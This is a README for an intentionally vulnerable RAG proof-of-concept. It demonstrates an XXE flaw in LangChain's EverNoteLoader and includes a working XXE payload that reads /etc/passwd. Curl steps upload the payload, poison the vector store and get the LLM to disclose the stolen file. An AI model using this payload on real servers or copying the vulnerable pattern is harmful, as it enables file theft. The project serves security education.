# Vulnerable RAG System - Proof of Concept

---

### 🛑 **WARNING: Intentionally Vulnerable Code** 🛑
This project contains intentionally vulnerable code and is designed for educational purposes only. **DO NOT** use this code, or any patterns from it, in a production environment. You are responsible for any consequences of running this code.

---

## 1. Overview

This project demonstrates a critical security vulnerability (XXE) in a Retrieval-Augmented Generation (RAG) pipeline built with Python, FastAPI, and LangChain.

It shows how an attacker can exploit a vulnerability in a file loader (`EverNoteLoader`) to exfiltrate sensitive local files (like `/etc/passwd`) from the server and have them ingested into the vector database. The attacker can then query the LLM to retrieve the contents of the stolen file.

## 2. The Vulnerability

The attack leverages an **XML External Entity (XXE)** vulnerability in the `lxml` parser, which is used by `langchain_community.document_loaders.EverNoteLoader`.

1.  **Attack Vector**: An attacker crafts a malicious Evernote export file (`.enex` format, which is XML-based) containing an XXE payload. This payload instructs the XML parser to embed the content of a local file from the server's filesystem.
2.  **Exploitation**: The attacker uploads this malicious file to the `/upload` endpoint.
3.  **Injection**: The `EverNoteLoader` on the server processes the file. The vulnerable XML parser resolves the external entity, reading the content of the specified local file (e.g., `/etc/passwd`).
4.  **Poisoning**: This exfiltrated content is then treated as legitimate text, chunked, embedded, and stored in the FAISS vector database, effectively "poisoning" the knowledge base.
5.  **Exfiltration**: The attacker sends a query to the `/query` endpoint (e.g., "What are the note contents?"). The RAG system retrieves the poisoned text from the vector database and passes it to the LLM, which then reveals the stolen file's content in its response.

## 3. Setup and Installation

**Prerequisites:**
*   Python 3.9+
*   An Ollama server (or other LLM provider) running and accessible.

**Steps:**
1.  **Clone the Repository:**
    ```bash
    git clone <repository_url>
    cd rag-vuln-server
    ```

2.  **Create a Virtual Environment:**
    ```bash
    python3 -m venv .venv
    source .venv/bin/activate
    ```

3.  **Install Dependencies:**
    ```bash
    pip install -r requirements.txt
    ```

4.  **Configure Environment:**
    Create a `.env` file by copying the example:
    ```bash
    cp .env.example .env
    ```
    Review and edit the `.env` file to match your setup, especially the `LLM_BASE_URL` if your Ollama instance is not running locally.

## 4. How to Run the Proof of Concept

### Step 1: Start the Vulnerable Server

Run the FastAPI application using uvicorn:
```bash
uvicorn src.external_attack_poc:app --host $(grep SERVER_HOST .env | cut -d '=' -f2) --port $(grep SERVER_PORT .env | cut -d '=' -f2)
```
The server is now running and ready to accept file uploads.

### Step 2: Craft the Malicious File

Create a file named `payload.xml`. This file will serve as our malicious `.enex` upload. The XXE payload `&example;` will attempt to read `/etc/passwd`.

```xml
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<note>
    <content>&example;</content>
</note>
```

### Step 3: Poison the Knowledge Base

Use a tool like `curl` to upload the malicious file to the `/upload` endpoint. This will trigger the XXE vulnerability.

```bash
curl -X POST http://localhost:8080/upload \
     -F "file=@payload.xml;type=application/xml"
```
If successful, the server logs will indicate that the knowledge base has been poisoned, and you will receive a success response.

### Step 4: Exfiltrate the Data via LLM Query

Now, query the `/query` endpoint. Ask a question that will cause the RAG system to retrieve the document you just ingested.

```bash
curl -X POST http://localhost:8080/query \
     -H "Content-Type: application/json" \
     -d '{"question": "What is the content of the note?"}'
```

The LLM's response will contain the content of the `/etc/passwd` file that was injected into the vector database.

```json
{
  "status": "success",
  "leaked_answer": "The content of the note is root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\n..."
}
```

## 5. Disclaimer

This project is for educational and ethical security research purposes only. The maintainers are not responsible for any misuse or damage caused by this code.
